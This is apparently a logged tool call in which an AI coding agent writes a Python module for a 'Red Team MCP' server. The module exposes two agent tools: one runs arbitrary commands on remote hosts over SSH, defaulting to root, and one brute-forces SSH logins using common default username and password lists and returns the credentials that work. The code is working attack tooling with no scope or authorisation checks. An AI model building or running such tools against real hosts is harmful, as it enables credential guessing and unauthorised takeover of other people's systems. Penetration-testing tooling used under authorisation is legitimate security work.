loop 20 | Tool=Write, Args={"file_path":"/home/silimon/mcp-auto/claude_code/mcp_server/read-team-mcp-skjortan23/repo/src/red_team_mcp/ssh_scanner.py","content":"#!/usr/bin/env python3\n\"\"\"\nSSH Scanner Module - Red Team MCP\n\nThis module provides SSH-based tools for red team operations.\n\"\"\"\n\nimport asyncio\nimport json\nimport logging\nfrom typing import Annotated\n\nlogger = logging.getLogger(__name__)\n\n\ndef register_tools(app):\n    \"\"\"Register all SSH tools with the FastMCP app.\"\"\"\n\n    @app.tool()\n    async def ssh_execute(\n        host: Annotated[str, \"Target host IP address or hostname\"],\n        port: Annotated[int, \"SSH port number (default: 22)\"] = 22,\n        username: Annotated[str, \"Username for SSH authentication\"] = \"root\",\n        password: Annotated[str, \"Password for SSH authentication\"] = \"\",\n        command: Annotated[str, \"Command to execute on the remote host\"] = \"whoami\",\n    ) -> str:\n        \"\"\"\n        Execute a command on a remote host via SSH.\n\n        Connects to the target host using SSH with username/password authentication\n        and executes the specified command.\n\n        Examples:\n        - Basic command: host='192.168.1.100', command='whoami'\n        - Custom port: host='192.168.1.100', port=2222, command='id'\n        \"\"\"\n        try:\n            import paramiko\n\n            client = paramiko.SSHClient()\n            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n            client.connect(host, port=port, username=username, password=password, timeout=10)\n\n            stdin, stdout, stderr = client.exec_command(command)\n            output = stdout.read().decode(\"utf-8\", errors=\"replace\")\n            error = stderr.read().decode(\"utf-8\", errors=\"replace\")\n            exit_status = stdout.channel.recv_exit_status()\n\n            client.close()\n\n            return json.dumps({\n                \"success\": exit_status == 0,\n                \"exit_code\": exit_status,\n                \"output\": output,\n                \"error\": error,\n                \"host\": host,\n                \"port\": port,\n                \"username\": username,\n            })\n\n        except ImportError:\n            return json.dumps({\n                \"success\": False,\n                \"error\": \"paramiko library not installed. Install with: pip install paramiko\",\n            })\n        except Exception as e:\n            return json.dumps({\n                \"success\": False,\n                \"error\": str(e),\n                \"host\": host,\n                \"port\": port,\n                \"username\": username,\n            })\n\n    @app.tool()\n    async def ssh_brute_force(\n        host: Annotated[str, \"Target host IP address or hostname\"],\n        port: Annotated[int, \"SSH port number (default: 22)\"] = 22,\n        usernames: Annotated[str, \"Comma-separated list of usernames to try\"] = \"root,admin,ubuntu\",\n        passwords: Annotated[str, \"Comma-separated list of passwords to try\"] = \"password,123456,admin\",\n        max_attempts: Annotated[int, \"Maximum number of attempts (default: 100)\"] = 100,\n    ) -> str:\n        \"\"\"\n        Brute force SSH credentials using provided username and password lists.\n\n        Attempts to authenticate to the target host using combinations of\n        provided usernames and passwords.\n\n        Examples:\n        - Default list: host='192.168.1.100'\n        - Custom list: host='192.168.1.100', usernames='root,test', passwords='pass1,pass2'\n        \"\"\"\n        try:\n            import paramiko\n\n            user_list = [u.strip() for u in usernames.split(\",\") if u.strip()]\n            pass_list = [p.strip() for p in passwords.split(\",\") if p.strip()]\n\n            found_credentials = []\n            attempts = 0\n\n            for user in user_list:\n                for pwd in pass_list:\n                    if attempts >= max_attempts:\n                        break\n                    attempts += 1\n\n                    try:\n                        client = paramiko.SSHClient()\n                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n                        client.connect(host, port=port, username=user, password=pwd, timeout=5)\n\n                        found_credentials.append({\n                            \"username\": user,\n                            \"password\": pwd,\n                            \"host\": host,\n                            \"port\": port,\n                        })\n                        client.close()\n                    except Exception:\n                        pass\n\n            return json.dumps({\n                \"success\": len(found_credentials) > 0,\n                \"attempts\": attempts,\n                \"credentials_found\": found_credentials,\n                \"host\": host,\n                \"port\": port,\n            })\n\n        except ImportError:\n            return json.dumps({\n                \"success\": False,\n                \"error\": \"paramiko library not installed. Install with: pip install paramiko\",\n            })\n        except Exception as e:\n            return json.dumps({\n                \"success\": False,\n                \"error\": str(e),\n                \"host\": host,\n                \"port\": port,\n            })\n"}

